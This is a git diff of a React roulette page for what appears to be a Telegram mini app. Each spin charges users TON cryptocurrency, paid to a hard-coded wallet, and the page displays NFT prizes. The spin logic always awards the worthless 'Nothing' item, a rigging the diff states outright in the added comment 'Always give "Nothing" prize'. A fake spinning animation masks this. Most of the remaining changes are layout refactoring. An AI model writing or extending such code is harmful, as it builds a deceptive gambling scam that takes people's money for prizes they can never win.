@@ -2,12 +2,11 @@ import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { ScrollArea } from "@/components/ui/scroll-area";
-import { ChevronRight, ChevronDown } from "lucide-react";
+import { ArrowLeft, ChevronRight, ChevronDown } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useTonConnectUI } from '@tonconnect/ui-react';
 import { TonTransactionService } from '@/services/tonTransactionService';
-import { useTelegramBackButton } from "@/hooks/useTelegramBackButton";
-
+import UnifiedBackButton from "./UnifiedBackButton";
 interface RoulettePageProps {
   onBack?: () => void;
   onNavigateToReferral?: () => void;
@@ -17,7 +16,6 @@ interface RoulettePageProps {
   };
   onHideNavigation?: (hide: boolean) => void;
 }
-
 const RoulettePage = ({
   onBack,
   onNavigateToReferral,
@@ -32,19 +30,13 @@ const RoulettePage = ({
   const [hasFreeSpins, setHasFreeSpins] = useState(false);
   const [showAllPrizes, setShowAllPrizes] = useState(false);
   const [tonConnectUI] = useTonConnectUI();
-  const { toast } = useToast();
-
-  // Use Telegram back button instead of custom button
-  useTelegramBackButton({ 
-    onBack: onBack || (() => {}), 
-    isVisible: !!onBack 
-  });
-
+  const {
+    toast
+  } = useToast();
   useEffect(() => {
     onHideNavigation?.(true);
     return () => onHideNavigation?.(false);
   }, [onHideNavigation]);
-
   const gifts = [{
     name: "Plush Pepe",
     image: "https://nft.fragment.com/collection/plushpepe.webp",
@@ -150,9 +142,7 @@ const RoulettePage = ({
     image: "/nothing-icon.png",
     price: 0
   }];
-
   const spinPrices = [0.25, 0.5, 1, 2.5, 5];
-
   const handleSpin = async (isFree = false) => {
     if (isFree && !hasFreeSpins) {
       toast({
@@ -162,7 +152,6 @@ const RoulettePage = ({
       });
       return;
     }
-
     if (!isFree) {
       try {
         if (!tonConnectUI?.wallet) {
@@ -173,14 +162,19 @@ const RoulettePage = ({
           });
           return;
         }
-
         const transactionService = new TonTransactionService(tonConnectUI);
         toast({
           title: "Processing Transaction",
           description: "Please confirm the TON transaction in your wallet..."
         });
 
-        const tonTransactionResult = await transactionService.sendTransaction("UQCMWS548CHXs9FXls34OiKAM5IbVSOr0Rwe-tTY7D14DUoq", selectedSpinPrice, `Roulette Spin: ${selectedSpinPrice} TON`);
+        // Send TON transaction for the spin
+        const tonTransactionResult = await transactionService.sendTransaction("UQCMWS548CHXs9FXls34OiKAM5IbVSOr0Rwe-tTY7D14DUoq",
+        // Destination address
+        selectedSpinPrice,
+        // Amount in TON
+        `Roulette Spin: ${selectedSpinPrice} TON` // Comment
+        );
         console.log('TON Transaction completed:', tonTransactionResult);
       } catch (error: any) {
         console.error('Error processing spin transaction:', error);
@@ -206,10 +200,10 @@ const RoulettePage = ({
         return;
       }
     }
-
     setIsSpinning(true);
     setTimeout(() => {
-      const selectedGift = gifts[gifts.length - 1];
+      // Always give "Nothing" prize (last item in gifts array)
+      const selectedGift = gifts[gifts.length - 1]; // "Nothing" is now at the last index
       setIsSpinning(false);
       if (isFree) {
         setHasFreeSpins(false);
@@ -220,19 +214,15 @@ const RoulettePage = ({
       });
     }, 3000);
   };
-
   const displayedGifts = showAllPrizes ? gifts : gifts.slice(0, 4);
-
-  return (
-    <div className="h-screen unified-gaming-bg relative">
-      <ScrollArea className="h-full">
+  return <div className="h-screen unified-gaming-bg relative">
+      <ScrollArea className="h-full pb-36">
         <div className="min-h-screen text-white space-y-3">
-          <div className="px-4 space-y-3 pt-8">
-            {/* Header */}
-            <div className="mb-4">
-              <h1 className="text-2xl font-bold text-white">Roulette</h1>
-            </div>
+          
+          {/* Unified Header */}
+          {onBack && <UnifiedBackButton onBack={onBack} title="Roulette" />}
 
+          <div className="px-4 space-y-3">
             {/* Free Spin Section */}
             <Card className="bg-secondary/60 backdrop-blur-xl border-white/20 p-3 rounded-xl cursor-pointer hover:bg-secondary/80 transition-colors" onClick={() => onNavigateToReferral?.()}>
               <div className="flex items-center justify-between">
@@ -253,8 +243,7 @@ const RoulettePage = ({
               <div className="bg-secondary/60 backdrop-blur-xl rounded-2xl p-4 pt-8 border border-white/20">
                 <div className="overflow-hidden">
                   <div className={`flex gap-4 transition-transform duration-${isSpinning ? '3000' : '300'} ${isSpinning ? 'animate-pulse' : ''}`}>
-                    {[...gifts, ...gifts].map((gift, index) => (
-                      <div key={index} className="flex-shrink-0 flex flex-col items-center">
+                    {[...gifts, ...gifts].map((gift, index) => <div key={index} className="flex-shrink-0 flex flex-col items-center">
                         <div className="w-20 h-20 bg-secondary/30 rounded-xl overflow-hidden mb-2">
                           <img src={gift.image} alt={gift.name} className="w-full h-full object-contain" />
                         </div>
@@ -268,8 +257,7 @@ const RoulettePage = ({
                             </>
                           )}
                         </div>
-                      </div>
-                    ))}
+                      </div>)}
                   </div>
                 </div>
               </div>
@@ -280,8 +268,7 @@ const RoulettePage = ({
               <h3 className="text-lg font-bold text-blue-100">Prize List</h3>
               <div className="backdrop-blur-xl rounded-2xl p-4 border border-white/20 bg-black">
                 <div className="grid grid-cols-4 gap-3 mb-4">
-                  {displayedGifts.map((gift, index) => (
-                    <div key={index} className="flex flex-col items-center">
+                  {displayedGifts.map((gift, index) => <div key={index} className="flex flex-col items-center">
                       <div className="w-16 h-16 bg-secondary/30 rounded-xl overflow-hidden mb-2">
                         <img src={gift.image} alt={gift.name} className="w-full h-full object-contain" />
                       </div>
@@ -295,8 +282,7 @@ const RoulettePage = ({
                           </>
                         )}
                       </div>
-                    </div>
-                  ))}
+                    </div>)}
                 </div>
                 
                 <Button variant="ghost" onClick={() => setShowAllPrizes(!showAllPrizes)} className="w-full text-white/70 hover:text-white hover:bg-secondary/30">
@@ -306,51 +292,33 @@ const RoulettePage = ({
               </div>
             </div>
 
-            {/* Spin Price Selection */}
-            <div className="flex gap-2 justify-center">
-              {spinPrices.map(price => (
-                <Button 
-                  key={price} 
-                  variant={selectedSpinPrice === price ? "default" : "outline"} 
-                  size="sm" 
-                  onClick={() => setSelectedSpinPrice(price)} 
-                  className={`px-3 py-1.5 rounded-full transition-all text-xs ${
-                    selectedSpinPrice === price 
-                      ? 'bg-primary text-white border-primary shadow-lg shadow-primary/30' 
-                      : 'bg-secondary/60 text-white/70 border-white/20 hover:bg-secondary/80'
-                  }`}
-                >
-                  <img src="https://client.mineverse.app/static/media/ton.29b74391f4cbf5ca7924.png" alt="TON" className="w-2.5 h-2.5 mr-1" />
-                  {price}
-                </Button>
-              ))}
-            </div>
-            
-            {/* Spin Button */}
-            <Button 
-              onClick={() => handleSpin(false)} 
-              className="w-full bg-gradient-to-r from-primary to-primary/80 hover:from-primary/90 hover:to-primary/70 h-12 text-base font-bold rounded-2xl shadow-lg shadow-primary/40 transition-all duration-300 transform hover:scale-105 mx-4" 
-              disabled={isSpinning}
-            >
-              {isSpinning ? (
-                <div className="flex items-center gap-2">
-                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                  <span>Spinning...</span>
-                </div>
-              ) : (
-                <div className="flex items-center gap-2">
-                  <img src="https://client.mineverse.app/static/media/ton.29b74391f4cbf5ca7924.png" alt="TON" className="w-4 h-4" />
-                  <span>Spin for {selectedSpinPrice} TON</span>
-                </div>
-              )}
-            </Button>
-
             <div className="h-28"></div>
           </div>
         </div>
       </ScrollArea>
-    </div>
-  );
-};
 
+      {/* Fixed Bottom Section */}
+      <div className="fixed bottom-0 left-0 right-0 bg-gradient-to-t from-background via-background/95 to-transparent backdrop-blur-xl p-3 space-y-3">
+        
+        
+
+        <div className="flex gap-2 justify-center">
+          {spinPrices.map(price => <Button key={price} variant={selectedSpinPrice === price ? "default" : "outline"} size="sm" onClick={() => setSelectedSpinPrice(price)} className={`px-3 py-1.5 rounded-full transition-all text-xs ${selectedSpinPrice === price ? 'bg-primary text-white border-primary shadow-lg shadow-primary/30' : 'bg-secondary/60 text-white/70 border-white/20 hover:bg-secondary/80'}`}>
+              <img src="https://client.mineverse.app/static/media/ton.29b74391f4cbf5ca7924.png" alt="TON" className="w-2.5 h-2.5 mr-1" />
+              {price}
+            </Button>)}
+        </div>
+        
+        <Button onClick={() => handleSpin(false)} className="w-full bg-gradient-to-r from-primary to-primary/80 hover:from-primary/90 hover:to-primary/70 h-12 text-base font-bold rounded-2xl shadow-lg shadow-primary/40 transition-all duration-300 transform hover:scale-105" disabled={isSpinning}>
+          {isSpinning ? <div className="flex items-center gap-2">
+              <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+              <span>Spinning...</span>
+            </div> : <div className="flex items-center gap-2">
+              <img src="https://client.mineverse.app/static/media/ton.29b74391f4cbf5ca7924.png" alt="TON" className="w-4 h-4" />
+              <span>Spin for {selectedSpinPrice} TON</span>
+            </div>}
+        </Button>
+      </div>
+    </div>;
+};
 export default RoulettePage;
